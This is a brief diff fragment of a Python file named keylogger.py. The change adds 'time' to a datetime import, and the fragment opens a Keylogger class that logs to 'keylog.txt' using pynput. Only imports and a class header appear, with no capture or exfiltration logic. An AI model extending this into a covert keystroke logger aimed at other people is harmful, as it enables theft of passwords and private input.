@@ -1,7 +1,7 @@
 # keylogger.py
 
 from pynput import keyboard
-from datetime import datetime
+from datetime import datetime, time
 
 class Keylogger:
     def __init__(self, log_file="keylog.txt"):
